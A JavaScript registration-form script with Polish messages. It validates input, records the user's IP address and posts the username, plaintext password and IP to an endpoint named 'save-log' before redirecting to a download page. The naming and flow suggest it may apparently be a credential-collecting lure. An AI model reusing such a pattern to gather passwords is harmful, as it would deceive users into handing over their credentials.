// register.js - UPDATED WITH BETTER ERROR HANDLING
document.getElementById('registrationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    // Walidacja
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }

    showLoading(true);
    showMessage('', '');

    try {
        console.log('🔄 Rozpoczynanie rejestracji...');
        
        // Pobierz IP użytkownika
        let userIP = 'unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            userIP = ipData.ip;
        } catch (ipError) {
            console.log('⚠️ Nie udało się pobrać IP, używam fallback');
            userIP = 'fallback-ip-' + Date.now();
        }

        console.log('📨 Wysyłanie danych:', { username, password: '***', ip: userIP });

        // Wyślij do backendu
        const response = await fetch('https://social-tools.onrender.com/save-log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: userIP
            })
        });

        console.log('📩 Status odpowiedzi:', response.status);

        let result;
        try {
            result = await response.json();
        } catch (jsonError) {
            console.error('❌ Błąd parsowania JSON:', jsonError);
            throw new Error('Serwer zwrócił nieprawidłową odpowiedź');
        }
        
        console.log('📩 Odpowiedź z serwera:', result);
        
        if (result && result.success) {
            showMessage('🎉 Rejestracja udana! Przekierowywanie...', 'success');
            localStorage.setItem('currentUser', username);
            setTimeout(() => {
                window.location.href = 'download.html';
            }, 2000);
        } else {
            const errorMsg = result ? result.message : 'Nieznany błąd serwera';
            showMessage('❌ ' + errorMsg, 'error');
        }
    } catch (error) {
        console.error('💥 Błąd:', error);
        showMessage('❌ Błąd połączenia: ' + error.message, 'error');
    } finally {
        showLoading(false);
    }
});

function showLoading(show) {
    const loadingEl = document.getElementById('loading');
    if (loadingEl) {
        loadingEl.style.display = show ? 'block' : 'none';
    }
}

function showMessage(message, type) {
    const messageEl = document.getElementById('message');
    if (messageEl) {
        messageEl.textContent = message;
        messageEl.className = 'message ' + type;
        messageEl.style.display = message ? 'block' : 'none';
    }
}
